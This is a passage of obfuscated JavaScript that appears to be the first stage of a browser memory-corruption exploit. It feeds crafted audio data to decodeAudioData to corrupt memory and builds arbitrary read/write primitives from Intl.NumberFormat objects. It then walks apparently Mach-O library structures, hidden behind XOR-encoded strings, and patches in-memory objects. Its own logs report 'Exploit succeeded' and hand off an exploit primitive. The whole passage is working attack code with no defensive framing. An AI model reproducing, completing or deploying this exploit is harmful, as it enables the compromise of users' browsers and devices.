                                    if (n += String.fromCharCode(s), r += 1, r >= i) break
                                }
                                if (e = !1, 0 === a) break;
                                if (n += String.fromCharCode(a), r += 1, r >= i) break
                            }
                            return n
                        }
                        Ki(t) {
                            if ((t = Number(t)) % 2 != 0) throw new Error("");
                            this.je(this.We, t), t /= 2;
                            for (let i = 0; i < 4; i++) {
                                const n = this.Ve.charCodeAt(t + i);
                                if (Number.isNaN(n)) throw new Error("");
                                this.$e[i] = n
                            }
                            return this.He.getBigUint64(0, !0)
                        }
                        Me(t, i) {
                            if ((i = Number(i)) % 2 != 0) throw new Error("");
                            i /= 2;
                            for (let n = 0; n < 4; n++) {
                                const r = t.charCodeAt(i + n);
                                if (Number.isNaN(r)) throw new Error("");
                                this.$e[n] = r
                            }
                            return this.He.getBigUint64(0, !0)
                        }
                        async Je(t, i = null) {
                            const n = e.qi + _,
                                o = n + m,
                                c = n + y,
                                h = n + E;
                            let l = 0,
                                f = null,
                                w = null,
                                u = null;
                            if (!1 === this.Oe || null !== i) {
                                let t = (928141942 ^ 928141430);
                                if (null !== i && (t = Number(i)), BigInt(t) !== this.De) {
                                    this.De = BigInt(t);
                                    const i = t > (1198089544 ^ 1198090056);
                                    let n = 8 | t << 5;
                                    !0 === i && (n = (1416312649 ^ 1416353601)), u = S(s, new A(o, [n, 0])), l = 0, f = e.Xi.format(1 / 0);
                                    do {
                                        if (l += 1, l > 20) throw Error(0);
                                        for (let t = 0; t < 12; t++) await r.decodeAudioData(a);
                                        try {
                                            await r.decodeAudioData(u)
                                        } catch (t) { }
                                    } while (f === e.Xi.format(1 / 0));
                                    if (w = this.Me(e.Xi.format(1 / 0), Number(m)), w !== BigInt(n)) throw new Error("");
                                    if (!0 === i) {
                                        u = S(s, new A(c, [t, 0])), l = 0, f = e.Xi.format(1 / 0);
                                        do {
                                            if (l += 1, l > 20) throw Error(0);
                                            for (let t = 0; t < 12; t++) await r.decodeAudioData(a);
                                            try {
                                                await r.decodeAudioData(u)
                                            } catch (t) { }
                                        } while (f === e.Xi.format(1 / 0));
                                        if (w = this.Me(e.Xi.format(1 / 0), Number(y)), w !== BigInt(t)) throw new Error("")
                                    }
                                }
                            }
                            u = S(s, new A(h, [Number(t & BigInt(([70, 14, 48, 48, 48, 48, 48, 48, 48, 48].map(x => {
                                return String.fromCharCode(x ^ 118);
                            }).join("")))), 0])), l = 0, f = e.Xi.format(1 / 0);
                            do {
                                if (l += 1, l > 40) throw Error(0);
                                for (let t = 0; t < 12; t++) await r.decodeAudioData(a);
                                try {
                                    await r.decodeAudioData(u)
                                } catch (t) { }
                            } while (f === e.Xi.format(1 / 0));
                            u = S(s, new A(h + BigInt(4), [Number(t >> BigInt(32)), 0])), l = 0, f = e.Xi.format(1 / 0);
                            do {
                                if (l += 1, l > 40) throw Error(0);
                                for (let t = 0; t < 12; t++) await r.decodeAudioData(a);
                                try {
                                    await r.decodeAudioData(u)
                                } catch (t) { }
                            } while (f === e.Xi.format(1 / 0));
                            if (w = this.Me(e.Xi.format(1 / 0), Number(E)), w !== t) throw new Error("");
                            this.We = t, this.Ve = e.Xi.format(NaN), this.Oe = !0
                        }
                    }
                    const h = new c;
                    await h.init();
                    const l = h.Pe;
                    await h.Je(l), n(h.Ki(0));
                    const f = n(h.Ki(0));
                    let w = f - f % BigInt((1816809016 ^ 1816153656));
                    const u = BigInt((1802265673 ^ 1801872457));
                    await h.Je(w, u);
                    let g = null;
                    for (; null === g;) {
                        for (let t = BigInt(0); t < u; t += BigInt((1313814892 ^ 1313810796)))(4294967296 + (1969632586 ^ -1953771643)) === h.br(t) && (g = w + t);
                        null === g && (w -= u, await h.Je(w))
                    }
                    const d = 4,
                        b = 40,
                        B = 8,
                        k = 24,
                        v = 32;
                    await h.Je(g, BigInt((1983990839 ^ 1983974455)));
                    let F = null,
                        N = null;
                    const T = h.br(16);
                    (() => {
                        let t = v;
                        for (let i = 0; i < T; i++) {
                            const i = h.br(t),
                                n = h.br(t + d);
                            if (25 === i && ([106, 106, 97, 112, 109, 97].map(x => {
                                return String.fromCharCode(x ^ 53);
                            }).join("")) === h.Er(t + B)) {
                                const i = h.Ki(t + k),
                                    n = h.Ki(t + b);
                                return F = g - i, void (N = g - n)
                            }
                            t += n
                        }
                        throw new Error("")
                    })(), await h.Je(N, BigInt((1164271428 ^ 1164267332)));
                    const C = h.br((1314289713 ^ 1314290161)),
                        x = h.br((2003720249 ^ 2003720701)),
                        P = N + BigInt(C);
                    await h.Je(P, BigInt(32 * x));
                    const O = [];
                    let W = (846344769 ^ 1032703422),
                        D = 0;
                    for (let t = 0; t < x; t++) {
                        const i = 32 * t,
                            n = h.br(i + 24);
                        W = Math.min(n, W), D = Math.max(n, D), O.push({
                            Le: h.Ki(i) + F,
                            Re: n
                        })
                    }
                    await h.Je(N + BigInt(W), BigInt(D - W) + BigInt((1095519607 ^ 1095519323)));
                    const V = (() => {
                        for (const {
                            Le: t,
                            Re: i
                        }
                            of O)
                            if (([98, 56, 62, 63, 98, 33, 36, 47, 98, 62, 52, 62, 57, 40, 32, 98, 33, 36, 47, 62, 52, 62, 57, 40, 32, 18, 61, 57, 37, 63, 40, 44, 41, 99, 41, 52, 33, 36, 47].map(x => {
                                return String.fromCharCode(x ^ 77);
                            }).join("")) === h.Er(i - W)) return t;
                        throw new Error("")
                    })(),
                        $ = async t => {
                            let i = !1,
                                n = null,
                                r = null,
                                e = null,
                                o = null;
                            const s = {};
                            let a = null;
                            await h.Je(t, BigInt((1882473569 ^ 1882477665)));
                            const c = h.br(16);
                            let l = v;
                            for (let e = 0; e < c; e++) {
                                const e = h.br(l),
                                    c = h.br(l + d);
                                switch (e) {
                                    case 25: {
                                        const i = {
                                            Xe: h.Er(l + B, 16),
                                            qe: h.Ki(l + k),
                                            Ge: null,
                                            Qe: h.Ki(l + b)
                                        };
                                        switch (i.Xe) {
                                            case ([55, 55, 60, 45, 48, 60].map(x => {
                                                return String.fromCharCode(x ^ 104);
                                            }).join("")):
                                                o = t - i.qe;
                                                break;
                                            case ([110, 110, 125, 120, 127, 122, 116, 117, 120, 101].map(x => {
                                                return String.fromCharCode(x ^ 49);
                                            }).join("")):
                                                a = i.qe + o - i.Qe
                                        }
                                        if (void 0 !== s[i.Xe]) throw new Error("");
                                        s[i.Xe] = i;
                                        break
                                    }
                                    case (4294967296 + (1316571241 ^ -830912437)):
                                        i = !0, n = h.br(l + 40), r = h.br(l + 44);
                                        break;
                                    case (4294967296 + (1380348984 ^ -767134709)):
                                        i = !0, n = h.br(l + 8), r = h.br(l + 12)
                                }
                                l += c
                            }
                            for (const t of Object.keys(s)) {
                                const i = s[t];
                                i.Ge = i.qe + o
                            }
                            if (!1 === i) throw new Error("");
                            e = a + BigInt(n);
                            const f = new ArrayBuffer(r);
                            await h.Je(e, r);
                            const w = new Uint32Array(f);
                            for (let t = 0; t < w.length; t++) w[t] = h.br(4 * t);
                            const u = new Uint8Array(f),
                                g = t => {
                                    const i = u;
                                    let n = "",
                                        r = 0,
                                        e = !1;
                                    for (; !e;) {
                                        e = !0;
                                        let o = 0,
                                            s = 0;
                                        do {
                                            o += ((1313960505 ^ 1313960518) & i[r]) << s, s += 7
                                        } while ((1098134344 ^ 1098134472) & i[r++]);
                                        if (n === t && 0 !== o) {
                                            r++;
                                            let t = 0;
                                            s = 0;
                                            do {
                                                t += ((1850494570 ^ 1850494485) & i[r]) << s, s += 7
                                            } while ((1396272182 ^ 1396272310) & i[r++]);
                                            return t
                                        }
                                        r += o;
                                        const a = i[r++];
                                        for (let o = 0; o < a; o++) {
                                            let o = "";
                                            for (; 0 !== i[r];) o += String.fromCharCode(i[r++]);
                                            r++;
                                            let a = 0;
                                            s = 0;
                                            do {
                                                a += ((1181446996 ^ 1181446955) & i[r]) << s, s += 7
                                            } while ((1885751632 ^ 1885751760) & i[r++]);
                                            if (o.length && n + o === t.substr(0, n.length + o.length)) {
                                                n += o, r = a, e = !1;
                                                break
                                            }
                                        }
                                    }
                                    return null
                                },
                                I = i => {
                                    const n = g(([23].map(x => {
                                        return String.fromCharCode(x ^ 72)
                                    }).join("")) + (i));
                                    if (null === n) throw new Error("");
                                    return t + BigInt(n)
                                };
                            return {
                                Ye: g,
                                Ze: I
                            }
                        }, H = (await $(V)).Ze(([56, 60, 32, 58, 45, 41, 44, 23, 37, 41, 33, 38, 23, 60, 32, 58, 45, 41, 44, 23, 38, 56].map(x => {
                            return String.fromCharCode(x ^ 72);
                        }).join(""))), j = BigInt(64);
                    await h.Je(H, j);
                    const K = new Uint32Array(Number(j) / 4);
                    for (let t = 0; t < K.length; t += 1) K[t] = h.br(4 * t);
                    let J = null,
                        L = null;
                    for (const t in K) {
                        const i = K[t];
                        if (-(1463055181 ^ 657748813) == ((4294967296 + (1515861862 ^ -983943322)) & i)) {
                            const t = ((1127823425 ^ 1137100705) & i) >> 5 << 14 | ((1599034724 ^ 1062163812) & i) >> 29 << 12;
                            J = H - H % BigInt((1484342131 ^ 1484346227)) + BigInt(t)
                        } else if (-(1700999479 ^ 1671639351) == ((4294967296 + (875714420 ^ -873310348)) & i)) {
                            L = J + BigInt(8 * (i >> 10 & (1294812501 ^ 1294813866)));
                            break
                        }
                    }
                    if (null === L) throw new Error("");
                    await h.Je(L, BigInt((1330473825 ^ 1330473569)));
                    const R = h.Ki(0),
                        X = BigInt((1633316206 ^ 1633316318)),
                        q = BigInt((1969453647 ^ 1969453815)),
                        G = BigInt(16),
                        Q = [];
                    let Y = R;
                    do {
                        await h.Je(Y);
                        const t = h.Ki(X);
                        t - h.Ki(q) >= BigInt((1951421032 ^ 1951461992)) && Q.push({
                            io: Y,
                            no: t
                        }), Y = h.Ki(G)
                    } while (Y !== BigInt(0));
                    const Z = async t => {
                        const i = [(1733258864 ^ 1732917826), (1919894851 ^ 1919492208), t, (1718899798 ^ 1719039842), (812336994 ^ 811783510)];
                        let n = null;
                        const r = (t, ...e) => {
                            try {
                                r(t + 1, ...i, ...e)
                            } catch (t) {
                                h.Ke();
                                for (let t = 0; t < (1681351477 ^ 1681355573); t += 8)
                                    if (h.Ki(t) === BigInt(([1, 73, 87, 87, 87, 84, 1, 1, 1, 1, 1, 1, 1, 4, 4, 5, 2, 3].map(x => {
                                        return String.fromCharCode(x ^ 49);
                                    }).join(""))) && h.Ki(t + 8) === BigInt(([87, 31, 1, 1, 1, 2, 87, 87, 87, 87, 87, 87, 87, 81, 81, 82, 84, 84].map(x => {
                                        return String.fromCharCode(x ^ 103);
                                    }).join(""))) && h.Ki(t + 24) === BigInt(([6, 78, 80, 80, 80, 83, 6, 6, 6, 6, 6, 6, 6, 4, 4, 5, 5, 2].map(x => {
                                        return String.fromCharCode(x ^ 54);
                                    }).join(""))) && h.Ki(t + 32) === BigInt(([101, 45, 51, 51, 51, 48, 101, 101, 101, 101, 101, 101, 101, 108, 108, 103, 102, 97].map(x => {
                                        return String.fromCharCode(x ^ 85);
                                    }).join("")))) return void (n = h.Ki(t + 16))
                            }
                        };
                        for (const t in Q) {
                            const e = Q[t].no - BigInt((1752708705 ^ 1752725089));
                            if (await h.Je(e, BigInt((1278297418 ^ 1278301514))), r(0, ...i), null !== n) break
                        }
                        if (null === n) throw new Error("");
                        return n
                    }, tt = new Array((812536690 ^ 812536762));
                    tt.fill(null);
                    const it = await Z(tt);
                    await h.Je(it, BigInt(96));
                    const nt = h.Ki(8);
                    await h.Je(nt), tt.fill((1162883439 ^ 1162883348));
                    const rt = async (t, i) => {
                        const n = Number((i >> BigInt(32)).toString()),
                            e = Number((i & BigInt((4294967296 + (1831691832 ^ -1831691833)))).toString()),
                            o = S(s, new A(t, [e, 0]));
                        for (let t = 0; t < 12; t++) r.decodeAudioData(a);
                        try {
                            await r.decodeAudioData(o)
                        } catch (t) { }
                        const c = S(s, new A(t + BigInt(4), [n, 0]));
                        for (let t = 0; t < 12; t++) r.decodeAudioData(a);
                        try {
                            await r.decodeAudioData(c)
                        } catch (t) { }
                    }, et = [document.createElementNS(([37, 57, 57, 61, 119, 98, 98, 58, 58, 58, 99, 58, 126, 99, 34, 63, 42, 98, 127, 125, 125, 125, 98, 62, 59, 42].map(x => {
                        return String.fromCharCode(x ^ 77);
                    }).join("")), ([95, 92, 122, 86, 87, 79, 86, 85, 79, 92, 116, 88, 77, 75, 80, 65].map(x => {
                        return String.fromCharCode(x ^ 57);
                    }).join(""))), document.createElementNS(([81, 77, 77, 73, 3, 22, 22, 78, 78, 78, 23, 78, 10, 23, 86, 75, 94, 22, 11, 9, 9, 9, 22, 74, 79, 94].map(x => {
                        return String.fromCharCode(x ^ 57);
                    }).join("")), ([41, 42, 12, 32, 33, 57, 32, 35, 57, 42, 2, 46, 59, 61, 38, 55].map(x => {
                        return String.fromCharCode(x ^ 79);
                    }).join(""))), document.createElementNS(([15, 19, 19, 23, 93, 72, 72, 16, 16, 16, 73, 16, 84, 73, 8, 21, 0, 72, 85, 87, 87, 87, 72, 20, 17, 0].map(x => {
                        return String.fromCharCode(x ^ 103);
                    }).join("")), ([55, 52, 18, 62, 63, 39, 62, 61, 39, 52, 28, 48, 37, 35, 56, 41].map(x => {
                        return String.fromCharCode(x ^ 81);
                    }).join("")))], ot = et[0].orderX, st = et[1].orderX, at = et[2].orderX, ct = JSON.parse(([48, 90, 69, 90, 71, 75, 48, 54, 54].map(x => {
                        return String.fromCharCode(x ^ 107);
                    }).join("")));
                    tt[0] = ot, tt[1] = st, tt[2] = at, tt[3] = ct, tt[4] = (1496929129 ^ 1508376139), await h.Je(nt);
                    const ht = h.Ki(0),
                        lt = h.Ki(8),
                        ft = h.Ki(16),
                        wt = h.Ki(24),
                        ut = {
                            ro: [],
                            eo: [],
                            oo: []
                        };
                    await h.Je(lt);
                    const gt = h.Ki(24);
                    await h.Je(gt), ut.eo.push([BigInt(40), h.Ki(40)]), ut.eo.push([BigInt(48), h.Ki(48)]);
                    do {
                        await rt(gt + BigInt(16), BigInt(0)), await rt(gt + BigInt(24), BigInt(0)), h.Ke()
                    } while (h.Ki(16) !== BigInt(0) || h.Ki(24) !== BigInt(0));
                    await h.Je(ht);
                    const dt = h.Ki(24);
                    await h.Je(dt), ut.ro.push([BigInt(40), h.Ki(40)]), ut.ro.push([BigInt(48), h.Ki(48)]);
                    do {
                        await rt(dt + BigInt(16), BigInt(0)), await rt(dt + BigInt(24), BigInt(0)), h.Ke()
                    } while (h.Ki(16) !== BigInt(0) || h.Ki(24) !== BigInt(0));
                    await h.Je(ft);
                    const bt = h.Ki(24);
                    await h.Je(bt), ut.oo.push([BigInt(40), h.Ki(40)]), ut.oo.push([BigInt(48), h.Ki(48)]);
                    do {
                        await rt(bt + BigInt(16), BigInt(0)), await rt(bt + BigInt(24), BigInt(0)), h.Ke()
                    } while (h.Ki(16) !== BigInt(0) || h.Ki(24) !== BigInt(0));
                    await h.Je(dt);
                    do {
                        await rt(dt + BigInt(32), bt + BigInt(32) - BigInt(28)), h.Ke()
                    } while (h.Ki(32) !== bt + BigInt(32) - BigInt(28));
                    await h.Je(gt);
                    do {
                        await rt(gt + BigInt(32), bt + BigInt(32) - BigInt(28) + BigInt(4)), h.Ke()
                    } while (h.Ki(32) !== bt + BigInt(32) - BigInt(28) + BigInt(4));
                    window.log(`[Stage 1] Creating M instance with corrupted Intl.NumberFormat objects`);
                    const Bt = new M(dt, ot, gt, st, bt, at, wt, ct);
                    for (const t of [
                        [gt, ut.eo],
                        [dt, ut.ro],
                        [bt, ut.oo]
                    ]) {
                        const i = t[0],
                            n = t[1];
                        for (const t of n) {
                            const n = t[0],
                                r = t[1];
                            Bt.Hi(i + BigInt(n), r)
                        }
                    }
                    window.log(`[Stage 1] Patching et Intl.NumberFormat objects`);
                    for (const t in et) {
                        const i = et[t],
                            r = Bt.tA(i),
                            e = n(Bt.Ki(r + BigInt(24))),
                            o = Bt.br(e + BigInt(24));
                        Bt.dr(e + BigInt(24), o + (1733968200 ^ 1733951816))
                    }
                    window.log(`[Stage 1] Patching It ArrayBuffer objects`);
                    const It = [ot, st, at];
                    for (const t in It) {
                        const i = It[t],
                            r = Bt.tA(i),
                            e = n(Bt.Ki(r + BigInt(24))),
                            o = Bt.br(e + BigInt(8));
                        Bt.dr(e + BigInt(8), o + (1361928816 ^ 1361912432))
                    }
                    window.log(`[Stage 1] All patches applied, creating z wrapper instance`);
                    return i.Ji = N, i.Li = F, window.log(`[Stage 1] Exploit IIFE returning z instance`), new z(t, Bt)
                }(c);
                for (const t of e) {
                    if (null === t) continue;
                    const i = l.tr(t);
                    l.dr(i + 24, 0), l.dr(i + 28, 0), l.dr(i + 32, 0), l.dr(i + 36, 0)
                }
                for (const t in o) {
                    const i = o[t],
                        n = l.tr(i),
                        r = l.Dr(n + 24),
                        e = l.br(r + 0);
                    l.dr(r + 0, e + (1129085514 ^ 1129069130))
                }
                return window.log(`[Stage 1] Cleanup done, returning exploit primitive l`), o.length = 0, e.length = 0, l
            }()
        }();
        window.log(`[Stage 1] Exploit succeeded, assigning to P.zn.exploitPrimitive`);
        P.zn.exploitPrimitive = i
    } catch (t) {
        window.log(`[Stage 1] Exploit failed with error: ${t.name}: ${t.message}`);
        throw P.zn.exploitPrimitive = void 0, t
    }
}, r;